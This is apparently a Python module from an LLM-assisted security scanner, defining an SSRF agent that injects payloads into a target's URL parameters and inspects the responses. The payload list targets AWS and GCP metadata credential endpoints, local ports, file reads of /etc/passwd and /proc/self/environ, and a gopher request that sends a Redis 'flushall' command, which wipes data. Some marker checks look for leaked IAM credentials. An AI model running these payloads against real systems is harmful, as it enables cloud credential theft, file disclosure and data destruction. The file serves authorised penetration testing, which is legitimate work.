"""SSRF Attack Agent — Server-Side Request Forgery 🌐"""
from briar.agents.analyzer import SecurityAnalyzer
from briar.core.http import HTTPClient
from briar.core.params import SSRF as SSRF_PARAMS

class SSRFAgent:
    """Discovers SSRF vulnerabilities with real payload injection"""

    SSRF_PAYLOADS = [
        ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_creds"),
        ("http://metadata.google.internal/", "gcp_metadata"),
        ("http://metadata.google.internal/computeMetadata/v1/", "gcp_creds"),
        ("http://127.0.0.1:8080/", "localhost_scan"),
        ("http://127.0.0.1:3000/", "localhost_scan"),
        ("http://localhost:22/", "ssh_probe"),
        ("file:///etc/passwd", "file_protocol"),
        ("file:///proc/self/environ", "file_protocol"),
        ("gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "gopher_redis"),
    ]

    CLOUD_MARKERS = [
        ("ami-id", "AWS metadata"),
        ("instance-id", "AWS metadata"),
        ("security-credentials", "AWS IAM creds"),
        ("computeMetadata", "GCP metadata"),
        ("root:", "File read (/etc/passwd)"),
        ("/bin/bash", "File read"),
    ]

    def __init__(self, provider="ollama"):
        self.analyzer = SecurityAnalyzer(provider)
        self.http = HTTPClient(timeout=8)
        self.name = "SSRF"

    def scan(self, url: str, param_name: str = None, **kwargs) -> dict:
        """Scan for SSRF with real payloads"""
        findings = []
        ssrf_params = param_name and [param_name] or SSRF_PARAMS

        for param in ssrf_params[:10]:
            for payload, ssrf_type in self.SSRF_PAYLOADS:
                try:
                    result = self.http.send_payload(url, param, payload)
                    if "error" in result:
                        continue

                    text = result.get("text_snippet", "").lower()

                    # Cloud metadata detection
                    for marker, desc in self.CLOUD_MARKERS:
                        if marker.lower() in text:
                            findings.append({
                                "type": f"SSRF ({ssrf_type})",
                                "severity": "Critical" if "cred" in desc.lower() or "iam" in desc.lower() else "High",
                                "param": param,
                                "payload": payload,
                                "ssrf_type": ssrf_type,
                                "marker": marker,
                                "marker_desc": desc,
                                "status": result["status"],
                            })
                            break

                    # SSRF via status + length (localhost/cloud probe)
                    if result["status"] == 200 and len(text) > 50 and not findings:
                        findings.append({
                            "type": f"SSRF possible ({ssrf_type})",
                            "severity": "Medium",
                            "param": param,
                            "payload": payload,
                            "ssrf_type": ssrf_type,
                            "status": result["status"],
                            "length": result["length"],
                        })

                except:
                    pass

            if findings:
                break  # Found SSRF on this param, move to next

        analysis = f"SSRF scan complete for {url}\n\n"
        if findings:
            analysis += f"**{len(findings)} SSRF vulnerabilities found:**\n\n"
            for f in findings:
                analysis += f"- **{f['param']}**: {f['type']} via `{f['payload']}` — {f.get('marker_desc', f.get('ssrf_type', ''))}\n"
            analysis += "\n---\n\nLLM analysis of real SSRF findings:\n"
            llm_result = self.analyzer.analyze_endpoint(url, "GET", analysis)
            llm_result["real_findings"] = findings
        else:
            analysis += "No SSRF vulnerabilities detected with automated payloads.\n\nLLM analysis:\n"
            llm_result = self.analyzer.analyze_endpoint(url, "GET", analysis)
            llm_result["real_findings"] = findings

        llm_result["agent"] = self.name
        llm_result["type"] = "SSRF"
        llm_result["severity"] = "Critical" if any(f["severity"] == "Critical" for f in findings) else ("High" if findings else "Info")
        llm_result["test_payloads"] = [p[0] for p in self.SSRF_PAYLOADS[:4]]
        return llm_result
